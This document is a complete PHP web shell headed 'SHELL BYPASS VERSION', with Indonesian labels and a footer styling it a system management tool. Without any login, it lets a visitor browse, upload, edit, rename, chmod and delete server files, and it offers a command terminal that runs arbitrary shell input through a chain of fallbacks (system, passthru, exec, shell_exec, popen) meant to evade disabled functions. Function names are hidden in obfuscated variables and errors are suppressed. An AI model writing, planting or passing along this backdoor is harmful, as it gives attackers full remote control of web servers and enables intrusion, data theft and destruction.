<?php
error_reporting(0);

$aBbij = "123";
$Dq_af = "unlink";
$PQjJ8 = "rename";
$gExfF = "chmod";
$lER5H = "mkdir";
$xw5RL = "touch";
$AMyWE = "system";
$Xmoyv = "file_get_contents";
$oL0WR = "file_put_contents";

// Header
echo "<div style='background:#fff; color:#000; padding:15px; text-align:center; font-family:monospace; border:2px solid #000; border-radius:5px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);'>
      <h2 style='margin:0; font-size:24px; text-transform:uppercase; font-weight:bold;'>SHELL BYPASS VERSION</h2>
      <p style='margin:5px 0 0 0; font-weight:bold;'></p>
      </div><br>";

// Get current path
$lRMEv = isset($_GET["path"]) ? $_GET["path"] : getcwd();
$lRMEv = str_replace("\\", "/", $lRMEv);
chdir($lRMEv);

// Save file (edit)
if (isset($_POST["save_file"])) {
    if (@$oL0WR($_POST["edit_item"], $_POST["content"])) {
        echo "<b style='color:green'>✅ File Berhasil Disimpan!</b><br>";
    }
}

// Create new file
if (isset($_POST["new_file"])) {
    if (@$xw5RL($_POST["filename"])) {
        echo "<b style='color:green'>✅ File '{$_POST["filename"]}' Berhasil Dibuat!</b><br>";
    }
}

// Create new directory
if (isset($_POST["new_dir"])) {
    if (@$lER5H($_POST["dirname"])) {
        echo "<b style='color:green'>✅ Folder '{$_POST["dirname"]}' Berhasil Dibuat!</b><br>";
    }
}

// Action handling (delete, chmod, rename)
if (isset($_GET["action"])) {
    $lVCJs = $_GET["item"];

    // Delete
    if ($_GET["action"] == "del") {
        @$Dq_af($lVCJs);
    }

    // Chmod
    if ($_GET["action"] == "chmod" && isset($_POST["perm"])) {
        @$gExfF($lVCJs, octdec($_POST["perm"]));
    }

    // Rename
    if ($_GET["action"] == "ren" && isset($_POST["newname"])) {
        @$PQjJ8($lVCJs, $_POST["newname"]);
    }
}

// Show current path breadcrumb
echo "<b>Current Path:</b> ";
$dawqg = explode("/", $lRMEv);
foreach ($dawqg as $Qsqr4 => $hEFmc) {
    if ($hEFmc == '' && $Qsqr4 == 0) {
        echo "<a href='?path=/'>/</a>";
    }
    if ($hEFmc == '') {
        continue;
    }
    echo "<a href='?path=" . implode("/", array_slice($dawqg, 0, $Qsqr4 + 1)) . "'>{$hEFmc}</a> / ";
}

echo "<hr>";

// Edit file
if (isset($_GET["edit"])) {
    $J1KFC = $_GET["item"];
    echo "<h4>Editing: {$J1KFC}</h4>
    <form method='POST'>
        <textarea name='content' rows='15' style='width:100%;font-family:monospace;background:#f9f9f9;'>" . htmlspecialchars(@$Xmoyv($J1KFC)) . "</textarea><br>
        <input type='hidden' name='edit_item' value='{$J1KFC}'>
        <input type='submit' name='save_file' value='SIMPAN PERUBAHAN' style='padding:5px 15px;cursor:pointer;'>
        <a href='?path={$lRMEv}'>[ BATAL ]</a>
    </form><hr>";
}

// Upload, New File, New Folder forms
echo "<table width=\"100%\" cellpadding=\"5\">
<tr>
    <td valign=\"top\">
        <form method=\"POST\" enctype=\"multipart/form-data\">
        <b>Upload File:</b><br> <input type=\"file\" name=\"f\"> <input type=\"submit\" value=\"Upload\">
        </form>
    </td>
    <td valign=\"top\">
        <form method=\"POST\">
        <b>New File:</b><br> <input type=\"text\" name=\"filename\" placeholder=\"namafile.php\"> <input type=\"submit\" name=\"new_file\" value=\"Create\">
        </form>
    </td>
    <td valign=\"top\">
        <form method=\"POST\">
        <b>New Folder:</b><br> <input type=\"text\" name=\"dirname\" placeholder=\"nama_folder\"> <input type=\"submit\" name=\"new_dir\" value=\"Create\">
        </form>
    </td>
</tr>
</table><br>";

// Handle file upload
if (isset($_FILES["f"])) {
    if (move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
        echo "<b style='color:green'>✅ Upload Berhasil!</b><br>";
    }
}

// File listing table
echo "<table border='1' width='100%' cellpadding='5' style='border-collapse:collapse;font-family:Arial,sans-serif;'>
    <tr bgcolor='#333' style='color:#fff'><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>";

$KMTzj = dirname($lRMEv);
echo "<tr><td colspan='4' bgcolor='#eee'><a href='?path={$KMTzj}'><b>[ .. ] KE ATAS</b></a></td></tr>";

$tGFHC = scandir($lRMEv);
foreach ($tGFHC as $GuDcw) {
    if ($GuDcw == "." || $GuDcw == "..") {
        continue;
    }

    $Cie_X = decoct(fileperms($GuDcw) & 0777);
    $AMyWE_size = is_dir($GuDcw) ? "DIR" : filesize($GuDcw) . " B";
    $O8DE6 = is_writable($GuDcw) ? "#00ff00" : "#ff0000";
    $LHR5T = $lRMEv == "/" ? "/{$GuDcw}" : "{$lRMEv}/{$GuDcw}";

    if (is_dir($GuDcw)) {
        $CrYdl = "<a href='?path={$LHR5T}' style='text-decoration:none;'><b>[ {$GuDcw} ]</b></a>";
    } else {
        $CrYdl = "<span>{$GuDcw}</span>";
    }

    echo "<tr>
        <td>{$CrYdl}</td>
        <td>{$AMyWE_size}</td>
        <td><b><font color='{$O8DE6}'>{$Cie_X}</font></b></td>
        <td>
            <a href='?path={$lRMEv}&item={$GuDcw}&edit=1' style='text-decoration:none;'>[Edit]</a> |
            <a href='?path={$lRMEv}&item={$GuDcw}&action=del' onclick=\"return confirm('Hapus?')\" style='text-decoration:none;color:red;'>[Del]</a> |
            <form style='display:inline' method='POST' action='?path={$lRMEv}&item={$GuDcw}&action=ren'>
                <input name='newname' placeholder='Rename' size='5'><input type='submit' value='R'>
            </form>
            <form style='display:inline' method='POST' action='?path={$lRMEv}&item={$GuDcw}&action=chmod'>
                <input name='perm' placeholder='{$Cie_X}' size='4'><input type='submit' value='C'>
            </form>
        </td>
    </tr>";
}

echo "</table><br>";

// Terminal CMD (Multi-Bypass)
echo "<div style='background:#000; color:#0f0; padding:10px; font-family:monospace; border:1px solid #333;'>
      <b>Terminal CMD (Multi-Bypass):</b><br>
      <form method='POST'>
      $ <input type='text' name='cmd' style='background:transparent; color:#0f0; border:none; width:90%; outline:none;' placeholder='ls -la' value='" . htmlspecialchars(@$_POST["cmd"]) . "'>
      </form>";

if (isset($_POST["cmd"])) {
    $b2M32 = $_POST["cmd"] . " 2>&1";
    echo "<pre style='color:#0f0; background:#000; padding:10px; border-top:1px solid #333; white-space:pre-wrap;'>";

    if (function_exists("system")) {
        @system($b2M32);
    } elseif (function_exists("passthru")) {
        @passthru($b2M32);
    } elseif (function_exists("exec")) {
        $muh1t = [];
        @exec($b2M32, $muh1t);
        echo implode("\n", $muh1t);
    } elseif (function_exists("shell_exec")) {
        echo @shell_exec($b2M32);
    } elseif (function_exists("popen")) {
        $Cie_X = @popen($b2M32, "r");
        while (!feof($Cie_X)) {
            echo fread($Cie_X, 1024);
        }
        pclose($Cie_X);
    } else {
        echo "❌ Semua fungsi eksekusi (system, exec, passthru, dll) DIMATIKAN di server ini.";
    }

    echo "</pre>";
}

echo "</div><br>";
echo "<div style='text-align:center;font-size:12px;'>&copy; 2026 kamley77 - System Management Tool</div>";
